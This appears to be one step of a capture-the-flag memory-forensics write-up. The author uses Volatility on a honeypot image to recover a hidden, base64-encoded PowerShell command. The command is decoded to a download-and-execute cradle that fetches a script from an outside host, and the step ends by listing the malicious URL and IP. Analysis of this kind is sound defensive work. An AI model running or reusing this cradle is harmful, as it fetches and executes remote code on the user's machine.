1. `vol.py -f honeypot.raw windows.cmdline.CmdLine` find werid powershell command. The URL redirect to Rick Roll, so its likely the URL to download malware.
```
2700    powershell.exe  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /window hidden /e aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA==

=> iex ((new-object net.webclient).downloadstring('https://windowsliveupdater.com/update.ps1'))
```

https://windowsliveupdater.com/christmas_update.hta_2700_147.182.172.189
